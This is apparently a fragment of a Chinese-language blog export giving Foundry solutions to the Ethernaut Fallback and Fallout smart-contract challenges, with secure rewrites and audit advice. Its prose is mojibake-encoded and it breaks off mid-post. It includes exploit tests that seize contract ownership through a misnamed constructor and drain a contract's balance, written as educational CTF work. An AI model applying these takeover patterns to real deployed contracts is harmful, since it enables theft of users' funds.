assertEq(instance.getOwner(), attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ­¥éª¤3: æå–æ‰€æœ‰èµ„é‡‘</span><br><span class=\"line\">        uint256 initialBalance = attacker.balance;</span><br><span class=\"line\">        instance.withdraw();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯èµ„é‡‘æå–æˆåŠŸ</span><br><span class=\"line\">        assertGt(attacker.balance, initialBalance);</span><br><span class=\"line\">        assertEq(address(instance).balance, 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œ Fallback å…³å¡æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¾“å‡ºåº”è¯¥æ˜¾ç¤ºæ‰€æœ‰æ–­è¨€é€šè¿‡</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"é—®é¢˜æ ¹æº\"><a href=\"#é—®é¢˜æ ¹æº\" class=\"headerlink\" title=\"é—®é¢˜æ ¹æº\"></a>é—®é¢˜æ ¹æº</h3><ol>\n<li><strong>æƒé™æ£€æŸ¥ä¸å½“</strong> - <code>receive()</code> å‡½æ•°ä¸­æ²¡æœ‰é€‚å½“çš„æƒé™éªŒè¯</li>\n<li><strong>é€»è¾‘è®¾è®¡ç¼ºé™·</strong> - å…è®¸é€šè¿‡ç®€å•æ¡ä»¶è·å¾—å®Œæ•´æ§åˆ¶æƒ</li>\n<li><strong>å‡½æ•°èŒè´£æ··ä¹±</strong> - æ¥æ”¶èµ„é‡‘çš„å‡½æ•°ä¸åº”åŒ…å«æƒé™å˜æ›´é€»è¾‘</li>\n</ol>\n<h3 id=\"å®‰å…¨ä¿®å¤å»ºè®®\"><a href=\"#å®‰å…¨ä¿®å¤å»ºè®®\" class=\"headerlink\" title=\"å®‰å…¨ä¿®å¤å»ºè®®\"></a>å®‰å…¨ä¿®å¤å»ºè®®</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureFallback &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public contributions;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function contribute() public payable &#123;</span><br><span class=\"line\">        require(msg.value &lt; 0.001 ether);</span><br><span class=\"line\">        contributions[msg.sender] += msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // âœ… æé«˜é—¨æ§›ï¼Œé¿å…ç®€å•çš„æƒé™æå‡</span><br><span class=\"line\">        if(contributions[msg.sender] &gt; contributions[owner] &amp;&amp; </span><br><span class=\"line\">           contributions[msg.sender] &gt; 10 ether) &#123;</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // âœ… ç§»é™¤æƒé™å˜æ›´é€»è¾‘ï¼Œåªå¤„ç†èµ„é‡‘æ¥æ”¶</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        // ä»…è®°å½•æ¥æ”¶çš„èµ„é‡‘ï¼Œä¸ä¿®æ”¹æƒé™</span><br><span class=\"line\">        emit FundsReceived(msg.sender, msg.value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw() public onlyOwner &#123;</span><br><span class=\"line\">        payable(owner).transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event FundsReceived(address sender, uint amount);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"1-Fallback-å’Œ-Receive-å‡½æ•°\"><a href=\"#1-Fallback-å’Œ-Receive-å‡½æ•°\" class=\"headerlink\" title=\"1. Fallback å’Œ Receive å‡½æ•°\"></a>1. Fallback å’Œ Receive å‡½æ•°</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// receive() - æ¥æ”¶çº¯ETHè½¬è´¦æ—¶è°ƒç”¨</span><br><span class=\"line\">receive() external payable &#123;</span><br><span class=\"line\">    // å¤„ç†é€»è¾‘</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// fallback() - è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°æˆ–å¸¦æ•°æ®çš„ETHè½¬è´¦æ—¶è°ƒç”¨</span><br><span class=\"line\">fallback() external payable &#123;</span><br><span class=\"line\">    // å¤„ç†é€»è¾‘</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-æƒé™è®¾è®¡åŸåˆ™\"><a href=\"#2-æƒé™è®¾è®¡åŸåˆ™\" class=\"headerlink\" title=\"2. æƒé™è®¾è®¡åŸåˆ™\"></a>2. æƒé™è®¾è®¡åŸåˆ™</h3><ul>\n<li><strong>æœ€å°æƒé™åŸåˆ™</strong> - ç»™äºˆæœ€å°‘å¿…è¦çš„æƒé™</li>\n<li><strong>æƒé™åˆ†ç¦»</strong> - ä¸åŒåŠŸèƒ½ä½¿ç”¨ä¸åŒæƒé™çº§åˆ«</li>\n<li><strong>æƒé™æ£€æŸ¥</strong> - åœ¨å…³é”®æ“ä½œå‰è¿›è¡Œå……åˆ†éªŒè¯</li>\n</ul>\n<h3 id=\"3-å®‰å…¨å¼€å‘æœ€ä½³å®è·µ\"><a href=\"#3-å®‰å…¨å¼€å‘æœ€ä½³å®è·µ\" class=\"headerlink\" title=\"3. å®‰å…¨å¼€å‘æœ€ä½³å®è·µ\"></a>3. å®‰å…¨å¼€å‘æœ€ä½³å®è·µ</h3><ul>\n<li><strong>é¿å…åœ¨ç‰¹æ®Šå‡½æ•°ä¸­å®ç°å…³é”®é€»è¾‘</strong></li>\n<li><strong>ä½¿ç”¨ OpenZeppelin çš„ Ownable æ¨¡å¼</strong></li>\n<li><strong>å……åˆ†çš„å•å…ƒæµ‹è¯•è¦†ç›–</strong></li>\n<li><strong>ä»£ç å®¡è®¡å’ŒåŒè¡Œè¯„å®¡</strong></li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Fallback å…³å¡è™½ç„¶ç®€å•ï¼Œä½†å±•ç¤ºäº†æ™ºèƒ½åˆçº¦å®‰å…¨çš„åŸºç¡€æ¦‚å¿µï¼š</p>\n<ul>\n<li>âœ… <strong>å‡½æ•°èŒè´£åˆ†ç¦»çš„é‡è¦æ€§</strong></li>\n<li>âœ… <strong>æƒé™éªŒè¯çš„å¿…è¦æ€§</strong> </li>\n<li>âœ… <strong>ç‰¹æ®Šå‡½æ•°çš„ä½¿ç”¨æ³¨æ„äº‹é¡¹</strong></li>\n<li>âœ… <strong>Foundry æµ‹è¯•æ¡†æ¶çš„åŸºæœ¬ä½¿ç”¨</strong></li>\n</ul>\n<p>è¿™æ˜¯å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨çš„è‰¯å¥½èµ·ç‚¹ï¼Œä¸ºåç»­æ›´å¤æ‚çš„æ”»å‡»æŠ€æœ¯æ‰“ä¸‹åŸºç¡€ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">ä¸‹ä¸€å…³: Level 2 - Fallout</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n<hr>\n<p><em>åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œä¸­ï¼Œæœ€ç®€å•çš„æ¼æ´å¾€å¾€éšè—ç€æœ€æ·±åˆ»çš„å®‰å…¨æ•™è®­ã€‚</em> ğŸ“</p>\n"},{"title":"Ethernaut Level 2: Fallout - æ„é€ å‡½æ•°å‘½åæ¼æ´","date":"2025-01-25T06:20:00.000Z","updated":"2025-01-25T06:20:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"å­¦ä¹ å¦‚ä½•åˆ©ç”¨ Solidity æ—©æœŸç‰ˆæœ¬æ„é€ å‡½æ•°å‘½åé”™è¯¯å¯¼è‡´çš„æƒé™æ¼æ´ï¼Œäº†è§£ä»£ç å®¡è®¡ä¸­çš„ç»†èŠ‚é‡è¦æ€§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 2: Fallout - æ„é€ å‡½æ•°å‘½åæ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 2 - Fallout](https://ethernaut.openzeppelin.com/level/2)  \n> **æ”»å‡»ç±»å‹**: æ„é€ å‡½æ•°å‘½åé”™è¯¯ã€å†å²æ¼æ´  \n> **éš¾åº¦**: â­â˜†â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¿™ä¸ªå…³å¡è€ƒæŸ¥çš„æ˜¯å¼€å‘è€…åœ¨ä»£ç ç¼–å†™ä¸­çš„ç»†å¿ƒç¨‹åº¦ï¼š\n\n1. **è·å–åˆçº¦æ§åˆ¶æƒ** - æˆä¸ºåˆçº¦çš„ `owner`\n2. **ç†è§£å†å²æ¼æ´** - å­¦ä¹  Solidity æ—©æœŸç‰ˆæœ¬çš„å®‰å…¨é—®é¢˜\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.6.0;\n\nimport \"openzeppelin-contracts-06/math/SafeMath.sol\";\n\ncontract Fallout {\n    \n    using SafeMath for uint256;\n    mapping (address => uint) allocations;\n    address payable public owner;\n\n    /* constructor */\n    function Fal1out() public payable {  // ğŸš¨ æ³¨æ„è¿™é‡Œçš„æ‹¼å†™ï¼\n        owner = msg.sender;\n        allocations[owner] = msg.value;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function allocate() public payable {\n        allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n    }\n\n    function sendAllocation(address payable allocator) public {\n        require(allocations[allocator] > 0);\n        allocator.transfer(allocations[allocator]);\n    }\n\n    function collectAllocations() public onlyOwner {\n        msg.sender.transfer(address(this).balance);\n    }\n\n    function allocatorBalance(address allocator) public view returns (uint) {\n        return allocations[allocator];\n    }\n}\n```\n\n### æ¼æ´è¯†åˆ«\n\nä»”ç»†è§‚å¯Ÿåˆçº¦ä»£ç ï¼Œæˆ‘ä»¬å‘ç°ä¸€ä¸ª**æå…¶å¾®å¦™ä½†è‡´å‘½çš„é”™è¯¯**ï¼š\n\n```solidity\n// åˆçº¦åç§°\ncontract Fallout {\n\n    /* constructor */\n    function Fal1out() public payable {  // âŒ è¿™é‡Œæ˜¯ \"Fal1out\" (æ•°å­—1)\n        owner = msg.sender;             // è€Œä¸æ˜¯ \"Fallout\" (å­—æ¯l)\n        allocations[owner] = msg.value;\n    }\n}\n```\n\n### å†å²èƒŒæ™¯\n\nåœ¨ **Solidity 0.4.22** ä¹‹å‰ï¼Œæ„é€ å‡½æ•°çš„å®šä¹‰æ–¹å¼æ˜¯ï¼š\n- åˆ›å»ºä¸€ä¸ªä¸åˆçº¦åç§°**å®Œå…¨ç›¸åŒ**çš„å‡½æ•°\n- è¯¥å‡½æ•°ä¼šåœ¨åˆçº¦éƒ¨ç½²æ—¶è‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡\n\nä½†åœ¨è¿™ä¸ªåˆçº¦ä¸­ï¼š\n- åˆçº¦åç§°æ˜¯ `Fallout`ï¼ˆå­—æ¯ lï¼‰\n- å‡½æ•°åç§°æ˜¯ `Fal1out`ï¼ˆæ•°å­— 1ï¼‰\n\n**ç»“æœ**: è¿™ä¸ªå‡½æ•°ä¸æ˜¯æ„é€ å‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ª**æ™®é€šçš„å…¬å¼€å‡½æ•°**ï¼\n\n### æ”»å‡»è·¯å¾„\n\n1. **è¯†åˆ«ä¼ªè£…çš„æ„é€ å‡½æ•°** - å‘ç° `Fal1out()` å‡½æ•°å¯ä»¥è¢«ä»»ä½•äººè°ƒç”¨\n2. **ç›´æ¥è°ƒç”¨å‡½æ•°** - è°ƒç”¨ `Fal1out()` æˆä¸º `owner`\n3. **éªŒè¯æƒé™è·å–** - ç¡®è®¤å·²è·å¾—åˆçº¦æ§åˆ¶æƒ\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Fallout.sol\";\n\ncontract FalloutTest is Test {\n    Fallout public instance;\n    address public attacker = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // éƒ¨ç½²ç›®æ ‡åˆçº¦\n        instance = new Fallout();\n        \n        // ç»™æ”»å‡»è€…ä¸€äº›åˆå§‹èµ„é‡‘\n        vm.deal(attacker, 1 ether);\n    }\n\n    function testFalloutExploit() public {\n        vm.startPrank(attacker);\n        \n        console.log(\"Original owner:\", instance.owner());\n        console.log(\"Attacker address:\", attacker);\n        \n        // æ”»å‡»æ­¥éª¤ï¼šç›´æ¥è°ƒç”¨é”™è¯¯å‘½åçš„\"æ„é€ å‡½æ•°\"\n        instance.Fal1out{value: 0.001 ether}();\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(instance.owner(), attacker);\n        console.log(\"New owner:\", instance.owner());\n        \n        vm.stopPrank();\n    }\n    \n    function testOriginalOwnerIsZero() public view {\n        // éªŒè¯åˆçº¦éƒ¨ç½²åæ²¡æœ‰ownerï¼ˆå› ä¸ºæ„é€ å‡½æ•°æœªæ‰§è¡Œï¼‰\n        assertEq(instance.owner(), address(0));\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œ Fallout å…³å¡æµ‹è¯•\nforge test --match-contract FalloutTest -vvv\n\n# é¢„æœŸè¾“å‡ºï¼š\n# [PASS] testFalloutExploit()\n# [PASS] testOriginalOwnerIsZero()\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### ç°ä»£ Solidity è§£å†³æ–¹æ¡ˆ\n\nä» **Solidity 0.4.22** å¼€å§‹ï¼Œå¼•å…¥äº† `constructor` å…³é”®å­—ï¼š\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract SecureFallout {\n    address public owner;\n    mapping (address => uint) allocations;\n    \n    // âœ… ä½¿ç”¨ constructor å…³é”®å­—\n    constructor() {\n        owner = msg.sender;\n    }\n    \n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n    \n    // å…¶ä»–å‡½æ•°...\n}\n```\n\n### å®‰å…¨æœ€ä½³å®è·µ\n\n1. **ä½¿ç”¨ç°ä»£è¯­æ³•**\n```solidity\n// âŒ æ—§ç‰ˆæœ¬ï¼ˆå®¹æ˜“å‡ºé”™ï¼‰\nfunction ContractName() public {\n    // æ„é€ é€»è¾‘\n}\n\n// âœ… æ–°ç‰ˆæœ¬ï¼ˆæ˜ç¡®ä¸”å®‰å…¨ï¼‰\nconstructor() {\n    // æ„é€ é€»è¾‘\n}\n```\n\n2. **ä»£ç å®¡è®¡æ£€æŸ¥æ¸…å•**\n```solidity\n// æ£€æŸ¥é¡¹ç›®ï¼š\n// âœ… æ„é€ å‡½æ•°åç§°ä¸åˆçº¦åç§°æ˜¯å¦å®Œå…¨åŒ¹é…\n// âœ… æ˜¯å¦ä½¿ç”¨äº†ç°ä»£ constructor è¯­æ³•\n// âœ… æ˜¯å¦æœ‰å¤šä¸ªç±»ä¼¼æ„é€ å‡½æ•°çš„å‡½æ•°\n// âœ… æƒé™åˆå§‹åŒ–æ˜¯å¦æ­£ç¡®æ‰§è¡Œ\n```\n\n3. **ç¼–è¯‘å™¨è­¦å‘Š**\n```bash\n# ç°ä»£ç¼–è¯‘å™¨ä¼šå¯¹å¯ç–‘çš„å‡½æ•°åå‘å‡ºè­¦å‘Š\nWarning: Function state mutability can be restricted to pure\nWarning: This function has the same name as the contract\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### 1. Solidity ç‰ˆæœ¬æ¼”è¿›\n\n| ç‰ˆæœ¬ | æ„é€ å‡½æ•°è¯­æ³• | å®‰å…¨æ€§ |\n|------|------------|--------|\n| < 0.4.22 | `function ContractName()` | âŒ å®¹æ˜“æ‹¼å†™é”™è¯¯ |\n| >= 0.4.22 | `constructor()` | âœ… æ˜ç¡®ä¸”å®‰å…¨ |\n\n### 2. å¸¸è§å‘½åé”™è¯¯\n\n```solidity\ncontract MyContract {\n    // âŒ å¸¸è§é”™è¯¯ç±»å‹\n    function MyContracr() public { }  // æ‹¼å†™é”™è¯¯\n    function myContract() public { }  // å¤§å°å†™é”™è¯¯\n    function MyContract_() public { } // å¤šä½™å­—ç¬¦\n    function MyContract() public { }  // å¯èƒ½æ­£ç¡®ï¼Œä½†ä¸æ¨è\n}\n```\n\n### 3. ä»£ç å®¡è®¡é‡ç‚¹\n\n- **å­—ç¬¦ç›¸ä¼¼æ€§æ£€æŸ¥** - 1 vs l, 0 vs O\n- **å¤§å°å†™æ•æ„Ÿæ€§** - Solidity åŒºåˆ†å¤§å°å†™\n- **é¢å¤–å­—ç¬¦æ£€æŸ¥** - ä¸‹åˆ’çº¿ã€ç©ºæ ¼ç­‰\n- **ç¼–ç é—®é¢˜** - Unicode å­—ç¬¦æ··ç”¨\n\n## ğŸ” å®é™…æ¡ˆä¾‹åˆ†æ\n\n### å†å²ä¸Šçš„ç±»ä¼¼æ¼æ´\n\n1. **Rubixi æ™ºèƒ½åˆçº¦** (2016)\n   - åˆçº¦ä» `DynamicPyramid` é‡å‘½åä¸º `Rubixi`\n   - å¿˜è®°æ›´æ–°æ„é€ å‡½æ•°åç§°\n   - å¯¼è‡´ä»»ä½•äººéƒ½å¯ä»¥æˆä¸º owner\n\n2. **å…¶ä»–ç±»ä¼¼æ¡ˆä¾‹**\n   - å¤åˆ¶ç²˜è´´ä»£ç æ—¶å¿˜è®°ä¿®æ”¹å‡½æ•°å\n   - å›¢é˜Ÿåä½œä¸­çš„æ²Ÿé€šå¤±è¯¯\n   - è‡ªåŠ¨åŒ–é‡æ„å·¥å…·çš„ç¼ºé™·\n\n### æ¼æ´å½±å“è¯„ä¼°\n\n- **ç›´æ¥å½±å“**: å®Œå…¨ä¸§å¤±åˆçº¦æ§åˆ¶æƒ\n- **èµ„é‡‘é£é™©**: åˆçº¦ä¸­çš„æ‰€æœ‰èµ„é‡‘\n- **ä¿®å¤éš¾åº¦**: æ— æ³•ä¿®å¤ï¼Œéœ€è¦é‡æ–°éƒ¨ç½²\n- **æ£€æµ‹éš¾åº¦**: æä½ï¼Œä½†å®¹æ˜“è¢«å¿½è§†\n\n## ğŸ¯ æ€»ç»“\n\nFallout å…³å¡å±•ç¤ºäº†ä¸€ä¸ªçœ‹ä¼¼å¾®ä¸è¶³é“ä½†åæœä¸¥é‡çš„æ¼æ´ï¼š\n\n- âœ… **ç»†èŠ‚å†³å®šæˆè´¥** - ä¸€ä¸ªå­—ç¬¦çš„å·®å¼‚å¯¼è‡´å®Œå…¨ä¸åŒçš„ç»“æœ\n- âœ… **å·¥å…·çš„é‡è¦æ€§** - ç°ä»£ç¼–è¯‘å™¨å’Œå·¥å…·å¯ä»¥é¿å…æ­¤ç±»é”™è¯¯\n- âœ… **ä»£ç å®¡è®¡çš„ä»·å€¼** - äººå·¥å®¡è®¡èƒ½å‘ç°å·¥å…·é—æ¼çš„é—®é¢˜\n- âœ… **ç‰ˆæœ¬å‡çº§çš„å¿…è¦æ€§** - ä½¿ç”¨æœ€æ–°çš„å®‰å…¨ç‰¹æ€§\n\nè¿™ä¸ªæ¡ˆä¾‹æé†’æˆ‘ä»¬ï¼Œåœ¨æ™ºèƒ½åˆçº¦å¼€å‘ä¸­ï¼Œ**æ²¡æœ‰å°é”™è¯¯ï¼Œåªæœ‰å¤§æŸå¤±**ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)**\n- **[ä¸‹ä¸€å…³: Level 3 - Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*é­”é¬¼è—åœ¨ç»†èŠ‚ä¸­ï¼Œå®‰å…¨å§‹äºæ¯ä¸€ä¸ªå­—ç¬¦ã€‚* ğŸ”","source":"_posts/ethernaut-level-02-fallout.md","raw":"---\ntitle: 'Ethernaut Level 2: Fallout - æ„é€ å‡½æ•°å‘½åæ¼æ´'\ndate: 2025-01-25 14:20:00\nupdated: 2025-01-25 14:20:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - åŸºç¡€æ”»å‡»ç¯‡ (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - æ„é€ å‡½æ•°\n  - å‘½åæ¼æ´\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"å­¦ä¹ å¦‚ä½•åˆ©ç”¨ Solidity æ—©æœŸç‰ˆæœ¬æ„é€ å‡½æ•°å‘½åé”™è¯¯å¯¼è‡´çš„æƒé™æ¼æ´ï¼Œäº†è§£ä»£ç å®¡è®¡ä¸­çš„ç»†èŠ‚é‡è¦æ€§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 2: Fallout - æ„é€ å‡½æ•°å‘½åæ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 2 - Fallout](https://ethernaut.openzeppelin.com/level/2)  \n> **æ”»å‡»ç±»å‹**: æ„é€ å‡½æ•°å‘½åé”™è¯¯ã€å†å²æ¼æ´  \n> **éš¾åº¦**: â­â˜†â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¿™ä¸ªå…³å¡è€ƒæŸ¥çš„æ˜¯å¼€å‘è€…åœ¨ä»£ç ç¼–å†™ä¸­çš„ç»†å¿ƒç¨‹åº¦ï¼š\n\n1. **è·å–åˆçº¦æ§åˆ¶æƒ** - æˆä¸ºåˆçº¦çš„ `owner`\n2. **ç†è§£å†å²æ¼æ´** - å­¦ä¹  Solidity æ—©æœŸç‰ˆæœ¬çš„å®‰å…¨é—®é¢˜\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.6.0;\n\nimport \"openzeppelin-contracts-06/math/SafeMath.sol\";\n\ncontract Fallout {\n    \n    using SafeMath for uint256;\n    mapping (address => uint) allocations;\n    address payable public owner;\n\n    /* constructor */\n    function Fal1out() public payable {  // ğŸš¨ æ³¨æ„è¿™é‡Œçš„æ‹¼å†™ï¼\n        owner = msg.sender;\n        allocations[owner] = msg.value;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function allocate() public payable {\n        allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n    }\n\n    function sendAllocation(address payable allocator) public {\n        require(allocations[allocator] > 0);\n        allocator.transfer(allocations[allocator]);\n    }\n\n    function collectAllocations() public onlyOwner {\n        msg.sender.transfer(address(this).balance);\n    }\n\n    function allocatorBalance(address allocator) public view returns (uint) {\n        return allocations[allocator];\n    }\n}\n```\n\n### æ¼æ´è¯†åˆ«\n\nä»”ç»†è§‚å¯Ÿåˆçº¦ä»£ç ï¼Œæˆ‘ä»¬å‘ç°ä¸€ä¸ª**æå…¶å¾®å¦™ä½†è‡´å‘½çš„é”™è¯¯**ï¼š\n\n```solidity\n// åˆçº¦åç§°\ncontract Fallout {\n\n    /* constructor */\n    function Fal1out() public payable {  // âŒ è¿™é‡Œæ˜¯ \"Fal1out\" (æ•°å­—1)\n        owner = msg.sender;             // è€Œä¸æ˜¯ \"Fallout\" (å­—æ¯l)\n        allocations[owner] = msg.value;\n    }\n}\n```\n\n### å†å²èƒŒæ™¯\n\nåœ¨ **Solidity 0.4.22** ä¹‹å‰ï¼Œæ„é€ å‡½æ•°çš„å®šä¹‰æ–¹å¼æ˜¯ï¼š\n- åˆ›å»ºä¸€ä¸ªä¸åˆçº¦åç§°**å®Œå…¨ç›¸åŒ**çš„å‡½æ•°\n- è¯¥å‡½æ•°ä¼šåœ¨åˆçº¦éƒ¨ç½²æ—¶è‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡\n\nä½†åœ¨è¿™ä¸ªåˆçº¦ä¸­ï¼š\n- åˆçº¦åç§°æ˜¯ `Fallout`ï¼ˆå­—æ¯ lï¼‰\n- å‡½æ•°åç§°æ˜¯ `Fal1out`ï¼ˆæ•°å­— 1ï¼‰\n\n**ç»“æœ**: è¿™ä¸ªå‡½æ•°ä¸æ˜¯æ„é€ å‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ª**æ™®é€šçš„å…¬å¼€å‡½æ•°**ï¼\n\n### æ”»å‡»è·¯å¾„\n\n1. **è¯†åˆ«ä¼ªè£…çš„æ„é€ å‡½æ•°** - å‘ç° `Fal1out()` å‡½æ•°å¯ä»¥è¢«ä»»ä½•äººè°ƒç”¨\n2. **ç›´æ¥è°ƒç”¨å‡½æ•°** - è°ƒç”¨ `Fal1out()` æˆä¸º `owner`\n3. **éªŒè¯æƒé™è·å–** - ç¡®è®¤å·²è·å¾—åˆçº¦æ§åˆ¶æƒ\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Fallout.sol\";\n\ncontract FalloutTest is Test {\n    Fallout public instance;\n    address public attacker = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // éƒ¨ç½²ç›®æ 